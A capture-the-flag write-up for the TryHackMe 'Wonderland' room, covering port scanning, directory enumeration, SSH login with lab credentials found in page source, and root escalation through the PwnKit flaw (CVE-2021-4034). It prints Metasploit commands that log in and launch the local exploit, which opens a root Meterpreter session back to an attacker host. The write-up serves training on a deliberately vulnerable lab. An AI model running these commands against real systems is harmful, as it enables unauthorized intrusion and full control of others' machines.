# TryHackMe — Wonderland

**Target IP:** 10.112.191.23

---

## Reconnaissance

### Port Scan

```
nmap -sV -sC 10.112.191.23
```

Results:

```
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Golang net/http server (title: "Follow the white rabbit")
```

---

## Enumeration

### Web — Directory Enumeration

The site title hints at a hidden path. Recursive enumeration reveals directories spelling out "rabbit":

```
gobuster dir -u http://10.112.191.23/r/     → /a
gobuster dir -u http://10.112.191.23/r/a/   → /b
gobuster dir -u http://10.112.191.23/r/a/b/ → /b
```

The full path `/r/a/b/b/i/t` contains Alice's SSH credentials in the page source:

```
alice : HowDothTheLittleCrocodileImproveHisShiningTail
```

---

## Initial Access

```bash
ssh alice@10.112.191.23
# password: HowDothTheLittleCrocodileImproveHisShiningTail
```

Note: this room deliberately inverts the flag locations — `root.txt` is in `/home/alice/` and `user.txt` is in `/root/`.

```bash
cat root.txt
# Permission denied
```

Alice cannot read `root.txt` directly, so privilege escalation is required.

---

## Privilege Escalation — CVE-2021-4034 (PwnKit)

`pkexec` version 0.105 is present on the target:

```bash
pkexec --version
pkexec version 0.105
```

This version is vulnerable to **CVE-2021-4034 (PwnKit)**. An SSH session was established via Metasploit, then PwnKit was used to escalate:

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.112.191.23
set USERNAME alice
set PASSWORD HowDothTheLittleCrocodileImproveHisShiningTail
run
```

```
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 1
set LHOST <ATTACKER_IP>
run
```

A Meterpreter session opened as **root**.

---

## Flags

**User flag** (at `/root/user.txt`):
`thm{[REDACTED]}`

**Root flag** (at `/home/alice/root.txt`):
`thm{[REDACTED]}`